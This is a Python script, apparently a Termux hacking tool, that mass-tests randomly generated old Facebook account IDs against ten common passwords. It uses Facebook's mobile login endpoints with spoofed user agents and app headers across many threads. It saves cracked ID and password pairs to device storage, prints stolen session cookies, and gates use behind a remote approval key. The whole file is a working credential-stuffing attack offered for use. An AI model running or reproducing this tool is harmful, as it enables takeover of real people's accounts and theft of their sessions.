#SCRIPT WRITTEN BY ARNOLD
#YOUTUBE YEi TECH MONTO
#SCRIPT WRITTEN FOR ORDER
#----------------------------[IMPORT/MODULE]-----------------------------------#
import os
import random
import sys
import subprocess
import time, uuid
from io import BytesIO

try:
    import requests
except ModuleNotFoundError:
    os.system("pip install requests")
    
#----------------------------[AUTO OPEN LINKS]----------------------------#
# Open YouTube, Telegram, WhatsApp
os.system("https://www.youtube.com/@foysolkhan4536")
os.system("https://t.me/+mVNPIvthr9BhYTNl")
os.system("https://chat.whatsapp.com/KrMZT7CiCnVAgQDZp05Sub?mode=ems_copy_t")

#----------------------------[BAKI KA CODE YAHAN AAYEGA]------------------#
    
try:
    import pycurl
except ModuleNotFoundError:
    os.system("pip install pycurl")

from concurrent.futures import ThreadPoolExecutor as ThreadPool
#-----------------------------[LINE]-----------------------------------#
def lin():
    print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
#-----------------------------[COLOR CODE]-----------------------------------#
r = "\x1b[1;31m"
g = "\x1b[1;32m"
b = "\x1b[1;34m"
p = "\x1b[1;35m"
m = "\x1b[1;36m"
w = "\x1b[1;37m"
loop = 0
oks = []
#-----------------------------[APPROVAL KEY]-----------------------------------#
a = str(os.geteuid())
b = str(os.geteuid())
build = subprocess.check_output('getprop ro.build.id',shell=True).decode('utf-8').replace('\n','')
x = (a+build+b).upper().replace(".","")
z = "X".join(x)
keys = z[15:]
final_key = "FARABI420-" + keys

appx_buffer = BytesIO()
appx_curl = pycurl.Curl()
appx_curl.setopt(pycurl.URL, "https://pastebin.com/raw/gkD83bzg")
appx_curl.setopt(pycurl.WRITEDATA, appx_buffer)
appx_curl.perform()
appx_data = appx_buffer.getvalue().decode("utf-8").splitlines()
raw = "".join(appx_data)

#----------------------------[USER/AGENT]-----------------------------------#
import random

def generate_bulk_user_agents(count=100):
    android_versions = [
        '2.1', '2.2.1', '2.3.6', '4.0.4', '4.1.2', '4.2.2', '4.4.2', '5.0.1', '5.1.1'
    ]
    ios_versions = [
        'iPhone OS 4_2_1', 'iPhone OS 5_1_1', 'iPhone OS 6_1_3', 'iPhone OS 7_1_2', 
        'iPhone OS 8_4'
    ]
    win_versions = ['Windows NT 5.1', 'Windows NT 6.1']  # XP, 7
    mac_versions = [
        'Macintosh; Intel Mac OS X 10_6_8', 'Macintosh; Intel Mac OS X 10_7_5',
        'Macintosh; Intel Mac OS X 10_8_5'
    ]

    android_models = [
        'GT-I9000', 'GT-I9100', 'GT-S5830', 'GT-N7000', 'HTC Desire', 'Nexus One', 
        'Xperia X10i', 'LG-P500', 'GT-N7100', 'SM-J500H', 'SM-G355H', 'SM-G610F',
        'SM-G900H', 'SM-G7102'
    ]

    iphone_models = [
        'iPhone', 'iPhone3,1', 'iPhone4,1', 'iPhone5,2', 'iPhone6,1'
    ]

    user_agents = []

    for _ in range(count):
        ua_type = random.choice(['android', 'ios', 'desktop'])

        if ua_type == 'android':
            android_ua = (
                f'Dalvik/1.6.0 (Linux; U; Android {random.choice(android_versions)}; '
                f'{random.choice(android_models)} Build/{random.choice(["FRF91", "GRJ90", "KOT49H", "JZO54K", "LRX21V"])}) '
                f'[FBAN/FB4A;FBAV/{random.randint(10, 120)}.0.0.{random.randint(1,40)}.{random.randint(10,400)};'
                f'FBPN/com.facebook.katana;FBLC/en_US;FBBV/{random.randint(1000000,1500000)};'
                f'FBCR/{random.choice(["Airtel", "Vodafone", "Jio", "Idea", "Telenor"])};'
                f'FBMF/{random.choice(["samsung", "HTC", "LGE", "Sony"])};'
                f'FBBD/{random.choice(["samsung", "HTC", "LGE", "Sony"])};'
                f'FBDV/{random.choice(android_models)};FBSV/{random.choice(android_versions)};'
                f'FBCA/armeabi-v7a;FBDM{{density=1.5,width=480,height=800}};FB_FW/1;]'
            )
            user_agents.append(android_ua)

        elif ua_type == 'ios':
            ios_ua = (
                f'Mozilla/5.0 ({random.choice(iphone_models)}; CPU {random.choice(ios_versions)} like Mac OS X) '
                f'AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/{random.randint(8,9)}A{random.randint(100,999)} '
                f'Safari/7534.48.3 [FBAN/FBIOS;FBAV/{random.randint(10, 110)}.0.0.{random.randint(1,30)}.{random.randint(10,300)};FBPN/com.facebook.Facebook;FBLC/en_US]'
            )
            user_agents.append(ios_ua)

        else:  # desktop
            desktop_ua = random.choice([
                f'Mozilla/5.0 ({random.choice(win_versions)}; rv:{random.randint(3, 10)}.0) Gecko/20100101 Firefox/{random.randint(3, 10)}.0',
                f'Mozilla/5.0 ({random.choice(win_versions)}) AppleWebKit/533.1 (KHTML, like Gecko) Chrome/7.0.{random.randint(500, 599)}.0 Safari/533.1',
                f'Mozilla/5.0 ({random.choice(mac_versions)}) AppleWebKit/534.30 (KHTML, like Gecko) Version/5.1 Safari/534.30'
            ])
            user_agents.append(desktop_ua)

    return user_agents
# Use ua_list as needed (no print)
##========ua2=================
import sys
import random
import time
import requests

def ua_2009_2016(count=100):
    android_versions = ['2.1', '2.2', '2.3.3', '2.3.6', '4.0.4', '4.1.2', '4.2.2', '4.4.2', '5.0.1', '5.1.1', '6.0.1']
    ios_versions = ['iPhone OS 3_1_3', 'iPhone OS 4_2_1', 'iPhone OS 5_1_1', 'iPhone OS 6_1_3', 'iPhone OS 7_1_2', 'iPhone OS 8_4']
    win_versions = ['Windows NT 5.1', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 10.0']
    mac_versions = ['Macintosh; Intel Mac OS X 10_6_8', 'Macintosh; Intel Mac OS X 10_7_5', 'Macintosh; Intel Mac OS X 10_8_5', 'Macintosh; Intel Mac OS X 10_9_5']

    android_models = [
        # Samsung
        'GT-I9000', 'GT-I9100', 'GT-S5830', 'GT-N7000', 'GT-N7100', 'SM-G900F', 'SM-G920F', 'SM-G925F', 'SM-G930F',
        # Redmi/Xiaomi
        'Redmi 1S', 'Redmi Note', 'Redmi 2', 'Redmi 3', 'Redmi Note 3', 'Redmi Note 4',
        # Nokia
        'Nokia X', 'Nokia XL', 'Nokia Lumia 520', 'Nokia Lumia 620', 'Nokia Lumia 720',
        # HTC
        'HTC Desire', 'HTC Wildfire', 'HTC One V', 'HTC One X', 'HTC One M7', 'HTC Sensation', 'HTC Explorer',
        # Huawei/Honor
        'Huawei U8650', 'Huawei Y511', 'Huawei G610', 'Huawei Honor 3C', 'Honor 4X', 'Honor 5X', 'Honor Holly',
        # Sony
        'Xperia X10i', 'Xperia Arc S', 'Xperia Mini', 'Xperia Z', 'Xperia Z1', 'Xperia Z2', 'Xperia M2',
        # Motorola
        'Moto G', 'Moto E', 'Moto X', 'Droid RAZR', 'Droid 4',
        # Others
        'LG-P500', 'LG-E400', 'Micromax A110', 'Micromax Canvas HD', 'Karbonn A1', 'Spice Mi-425', 'Lenovo A6000'
    ]

    iphone_models = ['iPhone1,2', 'iPhone2,1', 'iPhone3,1', 'iPhone4,1', 'iPhone5,2', 'iPhone6,1']

    user_agents = []

    for _ in range(count):
        ua_type = random.choice(['android', 'ios', 'desktop'])

        if ua_type == 'android':
            ua = (
                f'Dalvik/1.6.0 (Linux; U; Android {random.choice(android_versions)}; '
                f'{random.choice(android_models)} Build/{random.choice(["FRF91", "GRJ22", "IMM76D", "KOT49H", "JZO54K"])}) '
                f'[FBAN/FB4A;FBAV/{random.randint(5, 150)}.0.0.{random.randint(1,5)}.{random.randint(10,300)};'
                f'FBPN/com.facebook.katana;FBLC/en_US;FBBV/{random.randint(100000,900000)};'
                f'FBCR/{random.choice(["Airtel", "Vodafone", "Verizon", "AT&T", "T-Mobile", "Jio", "BSNL"])};'
                f'FBMF/{random.choice(["Samsung", "HTC", "LGE", "Sony", "Huawei", "Nokia", "Xiaomi", "Motorola"])};'
                f'FBBD/{random.choice(["Samsung", "HTC", "LGE", "Sony", "Huawei", "Nokia", "Xiaomi", "Motorola"])};'
                f'FBDV/{random.choice(android_models)};FBSV/{random.choice(android_versions)};'
                f'FBCA/armeabi-v7a;FBDM{{density=1.0,width=320,height=480}};FB_FW/1;]'
            )
            user_agents.append(ua)

        elif ua_type == 'ios':
            ua = (
                f'Mozilla/5.0 (iPhone; CPU {random.choice(ios_versions)} like Mac OS X) '
                f'AppleWebKit/534.46 (KHTML, like Gecko) Version/5.1 Mobile/{random.randint(8,10)}A{random.randint(100,999)} '
                f'Safari/7534.48.3 [FBAN/FBIOS;FBAV/{random.randint(5,150)}.0.0.{random.randint(1,5)}.{random.randint(10,300)};FBPN/com.facebook.Facebook;FBLC/en_US]'
            )
            user_agents.append(ua)

        else:  # desktop
            ua = random.choice([
                f'Mozilla/5.0 ({random.choice(win_versions)}; rv:{random.randint(8,12)}.0) Gecko/20100101 Firefox/{random.randint(8,12)}.0',
                f'Mozilla/5.0 ({random.choice(win_versions)}) AppleWebKit/534.30 (KHTML, like Gecko) Chrome/12.0.{random.randint(700,800)}.0 Safari/534.30',
                f'Mozilla/5.0 ({random.choice(mac_versions)}) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4'
            ])
            user_agents.append(ua)

    return user_agents
# Usage:
# ua_list = ua_2009_2016(100)  # Call once at the start, reuse during login cracking.
#-_-_-_-_-_-_-_-<-LOGO->-_-_-_-_-_-_-_-#
from datetime import datetime

# Get current date & time
now = datetime.now()
formatted_date = now.strftime("%d/%B/%Y")
formatted_time = now.strftime("%I:%M:%S %p")

# Your updated logo block with date & time at bottom
logo = (f"""\x1b[1;97m
\x1b[1;92m▶𝗫𝗗
\x1b[1;97m      ███████╗ █████╗ ██████╗  █████╗ ██████╗ ██╗
██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔══██╗██║
█████╗  ███████║██████╔╝███████║██████╔╝██║
██╔══╝  ██╔══██║██╔══██╗██╔══██║██╔══██╗██║
██║     ██║  ██║██║  ██║██║  ██║██████╔╝██║
╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═╝

AUTHOR   : FOYSAL AHMED FARABI 🌝
GITHUB   : FOYSAL-AHMED420
RLSSHIP  : AKHI🐥 FARABI ❤️      
VERSION  : 2.3
DATE     : {formatted_date}
TIME     : {formatted_time}
\x1b[1;92mASSALAMUWALAIKUM WELLCOME TO MY TOOLS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
""")
#----------------------------[MAIN/DEF]-----------------------------------#
def main():
    user = []
    os.system("clear")
    print(logo)
    print(f'{g}<{r}/{g}>{w} EXAMPLE   {r}: {w}10000 {g}| {w}20000 {g}| {w}90000')
    lin()
    limit = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}SERVER {r}~ {g}[{w}2011{r}-{w}2014{g}]")
    print(f"{g}[{r}2{g}] {w}SERVER {r}~ {g}[{w}2009{r}-{w}2010{g}]")
    lin()
    ask = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w}METHOD {r}[{g}A{r}]")
    print(f"{g}[{r}2{g}] {w}METHOD {r}[{g}B{r}]{g}")
    lin()
    mtd_opt = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    lin()
    print(f"{g}[{r}1{g}] {w} CRACK SPEED {r}[{g}HIGH{r}]")
    print(f"{g}[{r}2{g}] {w} CRACK SPEED {r}[{g}NORMAL{r}]{g}")
    lin()
    cspd = input(f"{g}<{r}/{g}>{w} CHOICE    {r}: {g}")
    if "1" in cspd:
        speedx = 45
    else:
        speedx = 30
        
    if ask in ["1"]:
        sv = f"{g}[{w}2011{r}-{w}2014{g}]"
        star = "10000"
        for i in range(int(limit)):
            data = str(random.choice(range(1000000000, 9999999999)))
            user.append(data)
    else:
        sv = f"{g}[{w}2009{r}-{w}2010{g}]"
        star = "100000"
        for i in range(int(limit)):
            data = str(random.choice(range(100000000, 999999999)))
            user.append(data)
    
    with ThreadPool(max_workers=speedx) as samira:
        tl = str(limit)
        os.system('clear')
        print(logo)
        print(f'{g}[{r}~{g}] {w}TOTAL ID {r}: {p}{limit} {g}[{r}~{g}] {w}SERVER {r}: {sv}')
        print(f'{g}[{r}~{g}] {w}IF NO RESULT {g}[{w}ON{r}/{w}OFF{g}]{w} AIRPLANE MODE{g}')
        lin()
        for mal in user:
            uid = star + mal
            if mtd_opt in ["1", "A"]:
                samira.submit(login, uid, tl)
            elif mtd_opt in ["2", "B"]:
                samira.submit(login1, uid, tl)
            else:
                samira.submit(login, uid, tl)
    print("")
    lin()
    print(f"{g}[{r}~{g}] {w}CRACK PROCESSED COMPLETED")
    print(f"{g}[{r}~{g}] {w}TOTAL OK ID : {g}{str(len(oks))}")
    lin()
    input(f"{g}[{r}~{g}] {w}PRESS ENTER TO EXIT")
    sys.exit()
#----------------------------[METHOD 1]-----------------------------------#
def login(uid, tl):
    global oks, loop
    try:
        ua_list = generate_bulk_user_agents(100)
        sys.stdout.write(f"\r➤ {g}ARNOLD{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:
            chosen_ua = random.choice(ua_list)
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(20000000, 40000000)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': chosen_ua,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) + 
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
            rp = requests.get(url, headers=headers).json()
            if "session_key" in rp:
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
#----------------------------[METHOD 2]-----------------------------------#
def login1(uid, tl):
    global oks, loop
    try:
        sys.stdout.write(f"\r➤ARNOLD{r}-{g}XD {r}[{g}{loop}{r}/{w}{tl}{r}] [{g}OK{r}/{g}{len(oks)}{r}]")
        sys.stdout.flush()
        for pw in ["123456", "1234567", "12345678", "123456789", "123123", "000000", "asdfgh", "qwerty", "112233", "987654321"]:

            url = 'https://graph.facebook.com/auth/login'

            ua_list2 = ua_2009_2016(100)
            arnold_ua = random.choice(ua_list2)
            headers = {
                'User-Agent': arnold_ua,
                'Accept-Encoding': 'gzip, deflate',
                'Accept': '*/*',
                'Connection': 'close',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': str(random.randint(11111,66666)),
                'X-FB-SIM-HNI': str(random.randint(11111,66666)),
                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'X-FB-Connection-Type': 'WIFI',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32',
            }
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'email': uid,
                'password': pw,
                'generate_analytics_claims': '1',
                'community_id': '',
                'cpl': 'true',
                'try_num': '1',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'password',
                'source': 'login',
                'error_detail_type': 'button_with_disabled',
                'enroll_misauth': 'false',
                'generate_session_cookies': '1',
                'generate_machine_id': '1',
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'fb_api_req_friendly_name': 'authenticate',
                'api_key': '62f8ce9f74b12f84c123cc23437a4a32',
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            }
            rp = requests.post(url, headers=headers, data=data).json()
            if "session_key" in rp:
                cookie = ";".join(i["name"] + "=" + i["value"] for i in rp["session_cookies"])
                print(f"\r\r{g}SUCCESS {p}➤ {w}{uid} {r}|{w} {pw}")
                try:
                    print(f"\r\r{r}[{g}COOKIES 🍪{r}]{p}➤ {w}{cookie}")
                    lin()
                except(KeyError, IOError):
                    pass
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break 
            elif "Please Confirm Email" in str(rp):
                print(f"\r\r{g}SUCCESS {p}➤ {g}{uid} {r}|{g} {pw}")
                open("/sdcard/ARNOLD-OLD-OK.txt", "a").write(uid + "|" + pw + "\n")
                oks.append(uid)
                break
            else:
                continue
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(30)
    except Exception as e:
        pass
#----------------------------[APPROVAL]-----------------------------------#
#----------------------------[APPROVAL SYSTEM - GITHUB]-----------------------------------#
def approval():
    global final_key
    try:
        response = requests.get("https://raw.githubusercontent.com/arnoldxishan/Apr/main/aprov.txt")
        if final_key in response.text:
            os.system("clear")
            print(logo)
            print(f"{g}[{r}~{g}] {w}YOUR KEY '{final_key}' IS APPROVED")
            lin()
            time.sleep(2)
            main()
        else:
            os.system("clear")
            print(logo)
            print(f"{r}[!] YOUR KEY '{final_key}' IS NOT APPROVED")
            print(f"{g}[!] PLEASE CONTACT ADMIN FOR APPROVAL")
            lin()
            input(f"{g}[{r}~{g}] COPY KEY AND PRESS ENTER TO OPEN WHATSAPP ")
            os.system("xdg-open https://wa.me/qr/B7IGQ6ZZWDEQM1")
            sys.exit()
    except Exception as e:
        print(f"{r}[ERROR] CHECK INTERNET OR GITHUB LINK!")
        sys.exit()
print(f"\n{g}Your device key: {final_key}\nSend this key to admin for approval.\n")
time.sleep(2)
approval()        

#----------------------------[CODE/END]-----------------------------------#
